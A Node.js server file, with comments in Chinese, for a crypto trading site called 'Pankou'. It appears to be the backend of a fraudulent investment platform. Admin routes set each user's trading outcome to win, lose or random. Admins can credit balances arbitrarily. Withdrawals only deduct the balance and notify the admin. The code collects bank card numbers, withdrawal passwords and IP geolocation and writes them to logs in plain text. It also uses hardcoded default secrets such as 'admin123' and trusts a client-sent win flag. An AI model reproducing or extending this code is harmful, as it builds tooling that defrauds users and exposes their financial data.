// app.js（合并后的统一版本）
const fs = require("fs");
const path = require("path");
const express = require("express");
const cors = require("cors");
const http = require("http");
const WebSocket = require("ws");
const notifier = require("./notifier");
require("dotenv").config();
const { pool, initTables } = require("./models/db");

// JWT & Web3
const jwt = require("jsonwebtoken");
const { verifyMessage } = require("ethers");

// 根据 IP 查询国家 + 城市
async function getIpLocation(ip) {
  // 本地开发环境，直接返回固定说明
  if (!ip || ip === "127.0.0.1" || ip === "::1") {
    return { country: "本地", city: "开发环境" };
  }

  // 处理 ::ffff:127.0.0.1 这种形式
  if (ip.startsWith("::ffff:")) {
    ip = ip.replace("::ffff:", "");
  }

  try {
    const resp = await fetch(`https://ipwho.is/${ip}`);
    const data = await resp.json();

    if (data && data.success) {
      return {
        country: data.country || "",
        city: data.city || "",
      };
    }
  } catch (e) {
    console.error("IP 定位失败:", e);
  }

  // 兜底：查不到就返回空
  return { country: "", city: "" };
}

// 你原来的业务路由
const tradeRoutes = require("./routes/tradeRoutes");
const assetRoutes = require("./routes/asset");
const marketRoutes = require("./routes/market");
const contractRoutes = require("./routes/contract");
const contractController = require("./controllers/contractController");

const app = express();

/*************************************************
 * 配置 & 中间件
 *************************************************/
app.use(cors());
app.use(express.json()); // 代替 body-parser
app.use(express.static("public")); // 静态资源

/*************************************************
 * 简单用户“数据库”（data/users.json）
 *************************************************/
const DB_FILE = path.join(__dirname, "data", "users.json");

function loadUsers() {
  if (!fs.existsSync(DB_FILE)) {
    fs.mkdirSync(path.dirname(DB_FILE), { recursive: true });
    fs.writeFileSync(DB_FILE, "{}");
  }
  return JSON.parse(fs.readFileSync(DB_FILE));
}

function saveUsers(data) {
  fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

/*************************************************
 * 常量
 *************************************************/
const JWT_SECRET = process.env.JWT_SECRET || "super-secret-key";
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "admin123"; // 后台密码
let currentLanguage = "English";

/*************************************************
 * 业务路由挂载（你原来的）
 *************************************************/
app.use("/api/trade", tradeRoutes);
app.use("/api/assets", assetRoutes);
app.use("/api/market", marketRoutes);
app.use("/api/contract", contractRoutes);
// /api/coins 我在下面用 CoinGecko 直接实现，如需用原来的 coinsRoutes 再挂上去

/*************************************************
 * 一些基础接口（你原来的）
 *************************************************/
// 修改密码接口
app.post("/api/withdrawal-password", (req, res) => {
  const { password } = req.body;
  if (!password) return res.status(400).json({ error: "Password required" });
  console.log("💾 Withdrawal password updated:", password);
  res.json({ message: "Withdrawal password updated successfully!" });
});

// ================= 真实用户信息接口（替换你原来的 /api/userinfo） =================
app.get("/api/userinfo", authMiddleware, (req, res) => {
  const users = loadUsers();
  const wallet = req.user.walletAddress.toLowerCase();

  if (!users[wallet]) {
    return res.status(404).json({ error: "User not found" });
  }

  const u = users[wallet];

  res.json({
    address: u.wallet,            // 用户真实钱包
    uid: u.userId,                // 登录时生成的 userId
    avatar: "/images/avatar.png", // 可改成用户上传
    language: currentLanguage,    // 当前语言
    addressLabel: u.addressLabel || "", // 国家+城市（如果有）
  });
});


// 语言切换
app.post("/api/language", (req, res) => {
  const { language } = req.body;
  if (!language) return res.status(400).json({ error: "Language required" });
  currentLanguage = language;
  console.log("🌐 Language updated to:", language);
  res.json({ message: `Language updated to ${language}` });
});

// 银行卡提交接口
app.post("/api/bankcard", (req, res) => {
  const { name, cardNumber, bankName } = req.body;

  if (!name || !cardNumber || !bankName) {
    return res.status(400).json({ error: "All fields are required" });
  }

  console.log("💳 New bank card:", { name, cardNumber, bankName });
  res.json({ message: "Bank card information saved successfully!" });
});

// 邮箱提交接口
app.post("/api/mail", (req, res) => {
  const { email } = req.body;

  if (!email || !email.includes("@")) {
    return res.status(400).json({ error: "Please enter a valid email address" });
  }

  console.log("📩 Received email:", email);
  res.json({ message: "Mail submitted successfully!" });
});

/*************************************************
 * Web3 登录：nonce + verify（来自 server.js，改到 /api/auth）
 *************************************************/
const nonceStore = {}; // address → nonce

// 1️⃣ 生成 nonce
app.post("/api/auth/nonce", (req, res) => {
  const { address } = req.body;

  if (!address) return res.status(400).json({ error: "Address is required" });

  const normalized = address.toLowerCase();
  const nonce = Math.random().toString(36).substring(2);

  console.log("⬅️ /api/auth/nonce for:", normalized, "nonce:", nonce);

  nonceStore[normalized] = nonce;

  res.json({ nonce });
});


app.post("/api/auth/verify", async (req, res) => {
  const { address, signature } = req.body;

  if (!address || !signature) {
    return res.status(400).json({ error: "Address and signature required" });
  }

  const normalized = address.toLowerCase();
  const nonce = nonceStore[normalized];

  if (!nonce) {
    console.log("❌ nonce missing for:", normalized);
    return res
      .status(400)
      .json({ error: "Nonce not found. Please request again." });
  }

  const message = `Login to Pankou - Nonce: ${nonce}`;

  console.log("⬅️ Incoming verify request:");
  console.log("    address:", normalized);
  console.log("    nonce:", nonce);
  console.log("    signature:", signature);
  console.log("    message:", message);

  let recovered;
  try {
    // 使用 ethers 的 verifyMessage
    recovered = verifyMessage(message, signature);
  } catch (err) {
    console.log("❌ Signature recover failed:", err);
    return res.status(400).json({ error: "Invalid signature" });
  }

  console.log("🔎 recovered address:", recovered);

  if (recovered.toLowerCase() !== normalized) {
    console.log("❌ Signature mismatch:", recovered.toLowerCase(), "≠", normalized);
    return res.status(401).json({
      error: "Signature mismatch",
      recovered: recovered.toLowerCase(),
      expected: normalized,
    });
  }

  // ================== 用户信息 & IP & 地理位置 ==================
  let users = loadUsers();

  // 取 IP
  let ip =
    (req.headers["x-forwarded-for"] || req.socket.remoteAddress || "")
      .toString()
      .split(",")[0]
      .trim();

  if (ip === "::1") ip = "127.0.0.1";
  if (ip.startsWith("::ffff:")) ip = ip.replace("::ffff:", "");

  const now = Date.now();

  // ⭐ 调用 IP 定位接口（国家 + 城市）
  const loc = await getIpLocation(ip);
  const addressLabel =
    loc.country && loc.city ? `${loc.country} ${loc.city}` : "";

  if (!users[normalized]) {
    // 第一次登录 = 注册
    users[normalized] = {
      userId: now,
      wallet: normalized,
      createdAt: now,
      lastLogin: now,
      registerIp: ip,
      lastLoginIp: ip,
      loginCount: 1,
      balances: {
        USDT: 0,
        BTC: 0,
        ETH: 0,
      },
      controlMode: "normal",
      remark: "",
      verifyStatus: "success",
      addressLabel, // ⭐ 国家 + 城市
      logs: [],
    };
    console.log(
      "🆕 User Registered:",
      normalized,
      "IP:",
      ip,
      "地址:",
      addressLabel
    );
  } else {
    // 老用户
    const u = users[normalized];
    u.lastLogin = now;
    u.lastLoginIp = ip;
    u.loginCount = (u.loginCount || 0) + 1;

    // 修复旧的 registerIp
    if (
      !u.registerIp ||
      u.registerIp === "::1" ||
      (typeof u.registerIp === "string" &&
        u.registerIp.startsWith("::ffff:"))
    ) {
      u.registerIp = ip;
    }

    if (!u.controlMode) u.controlMode = "normal";
    if (u.remark === undefined) u.remark = "";
    if (!u.verifyStatus) u.verifyStatus = "success";

    // 如果之前没有地址，只在这里补上（避免每次登录都覆盖）
    if (!u.addressLabel && addressLabel) {
      u.addressLabel = addressLabel;
    }

    console.log(
      "🔁 User Login:",
      normalized,
      "IP:",
      ip,
      "地址:",
      u.addressLabel || addressLabel,
      "count:",
      u.loginCount
    );
  }

  saveUsers(users);

  const userId = users[normalized].userId;

  const token = jwt.sign({ userId, walletAddress: normalized }, JWT_SECRET, {
    expiresIn: "30d",
  });

  delete nonceStore[normalized];

  console.log("✅ Wallet login success:", normalized, "userId:", userId);

  res.json({ token, userId });
});


/*************************************************
 * 用户 JWT 中间件 & Admin 中间件
 *************************************************/
function authMiddleware(req, res, next) {
  const raw = req.headers.authorization || "";
  const token = raw.startsWith("Bearer ") ? raw.slice(7) : null;

  if (!token) return res.status(401).json({ error: "Missing token" });

  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = decoded; // { userId, walletAddress }
    next();
  } catch (err) {
    console.error("JWT verify error:", err);
    return res.status(401).json({ error: "Invalid token" });
  }
}

function adminMiddleware(req, res, next) {
  const raw = req.headers.authorization || "";
  const token = raw.startsWith("Bearer ") ? raw.slice(7) : null;

  if (!token) return res.status(401).json({ error: "Missing admin token" });

  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    if (decoded.role !== "admin") {
      return res.status(403).json({ error: "Not admin" });
    }
    next();
  } catch (err) {
    console.error("Admin token verify error:", err);
    return res.status(401).json({ error: "Invalid admin token" });
  }
}

/*************************************************
 * Admin 登录 & 用户列表
 *************************************************/
app.post("/admin/login", (req, res) => {
  const { password } = req.body;
  if (password !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: "Invalid admin password" });
  }

  const token = jwt.sign({ role: "admin" }, JWT_SECRET, { expiresIn: "1d" });
  res.json({ adminToken: token });
});

app.get("/admin/users", adminMiddleware, (req, res) => {
  try {
    const usersObj = loadUsers();
    const list = Object.keys(usersObj).map((wallet) => {
      const u = usersObj[wallet];
      return {
        userId: u.userId,
        wallet: u.wallet,
        balances: u.balances || {},
        createdAt: u.createdAt,
        lastLogin: u.lastLogin,
        // ⭐ 新增的字段：备注、IP、地理说明、登录次数、控盘、认证状态
        remark: u.remark || "",
        registerIp: u.registerIp || "",
        lastLoginIp: u.lastLoginIp || "",
        addressLabel: u.addressLabel || "", // 将来你可以在别的地方写入“德国 Unitymedia 网络”这种文案
        loginCount: u.loginCount || 0,
        controlMode: u.controlMode || "normal",
        verifyStatus: u.verifyStatus || "success",
      };
    });
    res.json(list);
  } catch (err) {
    console.error("加载用户列表失败:", err);
    res.status(500).json({ error: "Failed to load users" });
  }
});

/*************************************************
 * 创建订单 + 扣钱 + 通知后台
 * POST /api/order/create
 *************************************************/
app.post("/api/order/create", authMiddleware, (req, res) => {
  const { amount, period, type, symbol, price } = req.body;

  const amt = Number(amount);
  if (!amt || amt <= 0) {
    return res.status(400).json({ error: "Invalid amount" });
  }

  const sym = (symbol || "USDT").toUpperCase();

  const users = loadUsers();
  const wallet = req.user.walletAddress;

  if (!users[wallet]) {
    return res.status(404).json({ error: "User not found" });
  }

  // 确保 balances 和对应币种存在
  if (!users[wallet].balances) {
    users[wallet].balances = {};
  }
  if (!users[wallet].balances[sym]) {
    users[wallet].balances[sym] = 0;
  }

  // 检查余额
  if (users[wallet].balances[sym] < amt) {
    return res.status(400).json({ error: "Insufficient balance" });
  }

  // 先扣钱
  users[wallet].balances[sym] -= amt;

  // 生成订单对象（这里 symbol 用原始 symbol 或 sym 都可以）
  const order = {
    id: Date.now(), // 简单用时间戳当订单ID
    wallet,
    symbol: sym,    // 统一用大写
    amount: amt,
    period,
    type,
    openPrice: price,
    createdAt: Date.now(),
  };

  // 保存用户数据（已经扣完钱）
  saveUsers(users);

  // ⭐ 从用户信息里取出备注
  const user = users[wallet];
  const remark = user?.remark || "";

  // ⭐ 构造一个“给后台用的订单对象”，带上备注
  const orderForNotify = {
    ...order,
    remark, // 关键字段：备注
  };

  // ⭐ 通知后台有新订单（带 remark）
  notifier.notifyNewOrder(orderForNotify);

  console.log("🆕 New order created & notified:", orderForNotify);

  // 返回给前台（这里不强制要带 remark）
  return res.json({
    success: true,
    balance: users[wallet].balances[sym],
    order,
  });
});


/*************************************************
 * 用户余额接口（获取 & 扣款）
 *************************************************/
app.get("/api/user/balance", authMiddleware, (req, res) => {
  const users = loadUsers();
  const wallet = req.user.walletAddress;

  if (!users[wallet]) {
    return res.status(404).json({ error: "User not found" });
  }

  const u = users[wallet];

  res.json({
    balances: u.balances,
    userId: u.userId,
    controlMode: u.controlMode || "normal", // ⭐ 关键
    remark: u.remark || "",
  });
});


app.post("/api/user/balance/deduct", authMiddleware, (req, res) => {
  const { amount, symbol } = req.body;

  const amt = Number(amount);
  if (!amt || amt <= 0) {
    return res.status(400).json({ error: "Invalid amount" });
  }

  const sym = (symbol || "USDT").toUpperCase();

  const users = loadUsers();
  const wallet = req.user.walletAddress;

  if (!users[wallet]) {
    return res.status(404).json({ error: "User not found" });
  }

  if (!users[wallet].balances[sym]) {
    users[wallet].balances[sym] = 0;
  }

  if (users[wallet].balances[sym] < amt) {
    return res.status(400).json({ error: "Insufficient balance" });
  }

  users[wallet].balances[sym] -= amt;
  saveUsers(users);

  return res.json({
    success: true,
    symbol: sym,
    balance: users[wallet].balances[sym],
  });
});

// ✅ 结算接口：根据结果给用户加钱（只加利润）
app.post("/api/user/balance/settle", authMiddleware, (req, res) => {
  const { amount, percent, isWin, symbol } = req.body;

  const amt = Number(amount);
  const p = Number(percent);

  if (!amt || !p) {
    return res.status(400).json({ error: "Invalid amount/percent" });
  }

  const sym = (symbol || "USDT").toUpperCase();

  const users = loadUsers();
  const wallet = req.user.walletAddress;

  if (!users[wallet]) {
    return res.status(404).json({ error: "User not found" });
  }

  if (!users[wallet].balances[sym]) {
    users[wallet].balances[sym] = 0;
  }

// ✅ 正确：赢了退本金 + 利润
if (isWin) {
  const profit = amt * p;       // 纯利润 = 金额 * 百分比
  users[wallet].balances[sym] += amt + profit;
}

  saveUsers(users);

  return res.json({
    success: true,
    symbol: sym,
    balance: users[wallet].balances[sym],
  });
});

/*************************************************
 * 用户提币接口：扣余额 + 记录日志 + 通知后台
 * POST /api/user/withdraw
 *************************************************/
app.post("/api/user/withdraw", authMiddleware, (req, res) => {
  const { symbol, amount, address, network, password } = req.body;

  // 基础校验
  if (!symbol || !amount || !address) {
    return res.status(400).json({ error: "symbol, amount, address required" });
  }

  const amt = Number(amount);
  if (!amt || amt <= 0) {
    return res.status(400).json({ error: "Invalid amount" });
  }

  const sym = symbol.toUpperCase();
  const net = network || "UNKNOWN";

  const users = loadUsers();
  const wallet = req.user.walletAddress;

  if (!users[wallet]) {
    return res.status(404).json({ error: "User not found" });
  }

  const user = users[wallet];

  // 这里目前你还没有真正保存“提币密码”，就先不强校验
  // 如果以后要做，可以在 /api/withdrawal-password 里把密码写进 user，再在这里校验
  console.log("🔑 Withdraw password from front:", password);

  // 确保 balances 结构存在
  if (!user.balances) user.balances = {};
  if (!user.balances[sym]) user.balances[sym] = 0;

  if (user.balances[sym] < amt) {
    return res.status(400).json({ error: "Insufficient balance" });
  }

  // ✅ 扣除余额
  user.balances[sym] -= amt;

  // ✅ 写一条日志（可选，将来你可以在前端做“提币记录”页面）
  if (!Array.isArray(user.logs)) user.logs = [];
  const now = Date.now();
  const withdrawRecord = {
    id: now,
    type: "withdraw",
    symbol: sym,
    amount: amt,
    address,
    network: net,
    wallet,
    userId: user.userId,
    createdAt: now,
  };
  user.logs.push(withdrawRecord);

  // 保存到 users.json
  saveUsers(users);

  // ✅ 通知后台（走你现有的 WebSocket + notifier）
  try {
    notifier.notifyNewWithdraw({
      ...withdrawRecord,
      remark: user.remark || "",
      addressLabel: user.addressLabel || "",
    });
  } catch (e) {
    console.error("notifyNewWithdraw error:", e);
  }


  console.log("💸 Withdraw created:", withdrawRecord);

  return res.json({
    success: true,
    symbol: sym,
    balance: user.balances[sym],
  });
});

/*************************************************
 * 后台管理：给指定钱包增加余额（Admin）
 *************************************************/
app.post("/admin/balance/add", adminMiddleware, (req, res) => {
  const { address, symbol, amount } = req.body;

  if (!address || !symbol || !amount) {
    return res
      .status(400)
      .json({ error: "address, symbol, amount required" });
  }

  const wallet = address.toLowerCase();
  const sym = symbol.toUpperCase();
  const amt = Number(amount);

  const users = loadUsers();

  if (!users[wallet]) {
    return res.status(400).json({ error: "User does not exist" });
  }

  if (!users[wallet].balances[sym]) {
    users[wallet].balances[sym] = 0;
  }

  users[wallet].balances[sym] += amt;

  saveUsers(users);

  return res.json({
    success: true,
    address: wallet,
    symbol: sym,
    newBalance: users[wallet].balances[sym],
  });
});
/*************************************************
 * 后台管理：设置用户控盘模式（控赢 / 控输 / 随机 / 正常）
 * POST /admin/user/control
 * body: { address: "0x...", mode: "normal" | "win" | "lose" | "random" }
 *************************************************/
/*************************************************
 * 后台管理：设置用户控盘模式 + 备注
 * POST /admin/user/control
 * body: { address: "0x...", mode: "normal" | "win" | "lose" | "random", remark?: string }
 *************************************************/
/*************************************************
 * 后台管理：设置用户控盘模式 + 备注
 * POST /admin/user/control
 * body: { address: "0x...", mode: "normal" | "win" | "lose" | "random", remark?: string }
 *************************************************/
app.post("/admin/user/control", adminMiddleware, (req, res) => {
  const { address, mode, remark } = req.body;

  if (!address || !mode) {
    return res.status(400).json({ error: "address, mode required" });
  }

  // 只允许这几种值
  const allow = ["normal", "win", "lose", "random"];
  if (!allow.includes(mode)) {
    return res.status(400).json({ error: "invalid mode" });
  }

  const wallet = address.toLowerCase();
  const users = loadUsers();

  if (!users[wallet]) {
    return res.status(404).json({ error: "User not found" });
  }

  // 更新控盘模式
  users[wallet].controlMode = mode;

  // ⭐ 只要前端传了 remark，就一起更新
  if (typeof remark === "string") {
    users[wallet].remark = remark.trim();
  }

  saveUsers(users);

  return res.json({
    success: true,
    address: wallet,
    controlMode: users[wallet].controlMode,
    remark: users[wallet].remark || "",
  });
});

/*************************************************
 * CoinGecko 缓存接口（/api/coins）
 *************************************************/
let cachedCoins = [];
let lastFetchTime = 0;

async function fetchCoins() {
  const now = Date.now();
  if (now - lastFetchTime < 60000 && cachedCoins.length > 0) {
    return cachedCoins;
  }

  try {
    const response = await fetch(
      "https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd"
    );
    const data = await response.json();

    cachedCoins = data.map((c) => ({
      id: c.id,
      symbol: c.symbol.toUpperCase(),
      name: c.name,
      image: c.image,
      price: c.current_price,
      change: c.price_change_percentage_24h,
    }));

    lastFetchTime = now;
    return cachedCoins;
  } catch (err) {
    console.error("Fetch coins failed:", err);
    return cachedCoins;
  }
}

app.get("/api/coins", async (req, res) => {
  const coins = await fetchCoins();
  res.json(coins);
});

/*************************************************
 * 测试路由
 *************************************************/
app.get("/", (req, res) => {
  res.send("后端服务已启动！");
});

/*************************************************
 * HTTP + WebSocket + Binance 转发
 *************************************************/
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
notifier.setWss(wss);

let binanceWs;

function connectBinance() {
  console.log("Connecting to Binance WS...");
  binanceWs = new WebSocket(
     "wss://mute-cherry-de72.xiaosheng90808.workers.dev/"
  );

  binanceWs.on("open", () => console.log("Connected to Binance WebSocket"));

  binanceWs.on("error", (err) => console.error("Binance WS Error:", err));

  binanceWs.on("close", () => {
    console.log("Binance WS closed. Reconnecting in 5s...");
    setTimeout(connectBinance, 5000);
  });

  binanceWs.on("message", (msg) => {
    wss.clients.forEach((client) => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(msg.toString());
      }
    });
  });
}

wss.on("connection", (ws) => {
  console.log("Frontend WebSocket connected");
  ws.on("close", () => console.log("Frontend WebSocket disconnected"));
});

connectBinance();

/*************************************************
 * 启动服务器 & 自动建表
 *************************************************/

(async () => {
  await initTables();        // ⭐⭐⭐ 在这里自动建表（只运行1次）
})();

// 启动服务器
const PORT = process.env.PORT || 5000;
server.listen(PORT, () =>
  console.log(`Server running on http://localhost:${PORT}`)
);

/*************************************************
 * 定时自动结算合约
 *************************************************/
setInterval(() => {
  contractController
    .settleContracts()
    .then(() => console.log("自动结算完成"))
    .catch((err) => console.error(err));
}, 10000);

